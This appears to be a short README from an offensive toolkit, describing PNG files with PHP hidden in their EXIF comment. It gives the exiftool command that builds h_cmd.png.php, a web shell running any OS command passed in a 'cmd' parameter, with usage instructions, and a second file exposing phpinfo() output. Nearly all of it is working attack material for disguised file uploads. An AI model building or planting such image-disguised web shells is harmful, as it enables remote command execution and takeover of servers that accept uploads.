## h_cmd.png.php
### How to use
```
view-source:htpps://<url>/h_cmd.png.php?cmd=<url_encoded_os_command>
```
**Tip** - Use https://www.urlencoder.org/ for url encoding
### How it was created
```
exiftool -comment="<?php echo PHP_EOL . '========================================' . PHP_EOL; echo system(\$_GET['cmd']); echo PHP_EOL . '========================================' . PHP_EOL; ?>" h_clean.png -o h_cmd.png.php
```
---
## h_phpinfo.png.php
### How it was created
```
exiftool -comment="<?php phpinfo(); ?>" h_clean.png -o h_phpinfo.php
```
